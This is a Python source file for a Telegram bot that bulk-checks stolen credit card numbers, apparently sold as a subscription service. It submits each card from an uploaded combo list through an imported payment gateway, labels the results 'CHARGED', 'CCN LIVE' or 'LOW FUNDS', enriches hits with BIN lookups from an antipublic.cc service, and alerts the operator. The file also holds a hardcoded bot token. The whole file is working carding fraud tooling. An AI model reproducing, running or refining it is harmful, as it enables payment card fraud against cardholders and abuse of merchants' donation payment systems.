import requests
import telebot, time
from telebot import types
from gate import Tele
import os
import threading

token = '8474077702:AAEHNoFYI7mBhkOpAjNN1hyA5q79L9CbTpc'
bot = telebot.TeleBot(token, parse_mode="HTML")
ADMIN_ID = '8268150049'

def get_bin_info(cc):
    try:
        data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
        return {
            'brand': data.get('brand', 'Unknown'),
            'type': data.get('type', 'Unknown'),
            'country': data.get('country_name', 'Unknown'),
            'flag': data.get('country_flag', '🏁'),
            'bank': data.get('bank', 'Unknown')
        }
    except:
        return {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🏁', 'bank': 'Unknown'}

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) != ADMIN_ID:
        bot.reply_to(message, "❌ <b>Access Denied</b>\nPlease contact @PonerDigitalService for subscription.")
        return
    bot.reply_to(message, "👋 <b>Welcome!</b>\nPlease send your .txt file to start checking.")

@bot.message_handler(content_types=["document"])
def handle_document(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    t = threading.Thread(target=process_checking, args=(message,))
    t.start()

def process_checking(message):
    stats = {"hit": 0, "ccn": 0, "cvv": 0, "low": 0, "bad": 0}
    status_msg = bot.reply_to(message, "⏳ <b>Preparing Combo...</b>").message_id
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    with open("combo.txt", "wb") as f:
        f.write(downloaded_file)

    try:
        if os.path.exists("stop.stop"): os.remove("stop.stop")

        with open("combo.txt", 'r') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            total = len(lines)

        for index, cc in enumerate(lines, start=1):
            if os.path.exists("stop.stop"):
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg, text="🛑 <b>STOPPED ✅</b>")
                os.remove("stop.stop")
                return

            bin_data = get_bin_info(cc)
            start_time = time.time()
            
            try:
                res_raw = str(Tele(cc))
                if "Donation Successful!" in res_raw or "Successful" in res_raw:
                    result = "CHARGED 🔥"
                    stats["hit"] += 1
                elif "insufficient funds" in res_raw:
                    result = "LOW FUNDS 💰"
                    stats["low"] += 1
                elif "security code is incorrect" in res_raw:
                    result = "CCN LIVE 💳"
                    stats["ccn"] += 1
                elif "additional action" in res_raw or "requires_action" in res_raw:
                    result = "3Ds (Requires Action) 🛡️"
                    stats["cvv"] += 1
                else:
                    result = "DECLINED ❌"
                    stats["bad"] += 1
            except:
                result = 'Error connection ⚠️'
            
            exec_time = round(time.time() - start_time, 2)
            perc = round((index / total) * 100, 2)

            status_title = "🚀 <b>CHECKING...</b>" if index < total else "✅ <b>CHECKING COMPLETED!</b>"
            status_text = (
                f"{status_title}\n"
                f"<b>PROGRESS : {perc}% ({index}/{total})</b>\n\n"
                f"🔥<b>HIT : {stats['hit']}</b>\n"
                f"✅<b>LIVE (CVV/CCN) : {stats['ccn']}</b>\n"
                f"✅<b>INSUFFICIENT : {stats['low']}</b>\n"
                f"✅<b>3Ds( requires_action ) : {stats['cvv']}</b>\n\n"
                f"👤<b>BOT BY : @PonerDigitalService</b>"
            )

            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(f"RESULT: {result}", callback_data="none"))
            kb.add(types.InlineKeyboardButton(f"💳 {cc}", callback_data="none"))
            
            if index < total:
                kb.add(types.InlineKeyboardButton("🛑 STOP", callback_data='stop'))

            try:
                bot.edit_message_text(
                    chat_id=message.chat.id, 
                    message_id=status_msg, 
                    text=status_text,
                    reply_markup=kb
                )
                time.sleep(0.3) 
            except:
                pass

            if any(x in result for x in ["CHARGED", "LOW FUNDS", "CCN LIVE", "3Ds"]):
                hit_alert = (
                    f"⭐ <b>HIT DETECTED!</b> ⭐\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"💳 <b>Card:</b> <code>{cc}</code>\n"
                    f"💬 <b>Response:</b> {result}\n"
                    f"ℹ️ <b>Info:</b> {bin_data['brand']} - {bin_data['type']}\n"
                    f"🏦 <b>Bank:</b> {bin_data['bank']}\n"
                    f"🌍 <b>Country:</b> {bin_data['country']} {bin_data['flag']}\n"
                    f"⏱️ <b>Time:</b> {exec_time}s\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"👤 <b>By: @PonerDigitalService</b>"
                )
                bot.send_message(message.chat.id, hit_alert)

    except Exception as e:
        print(f"Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    with open("stop.stop", "w") as f:
        f.write("stop")
    bot.answer_callback_query(call.id, "🛑 Stopping checking process...")

bot.polling(non_stop=True)
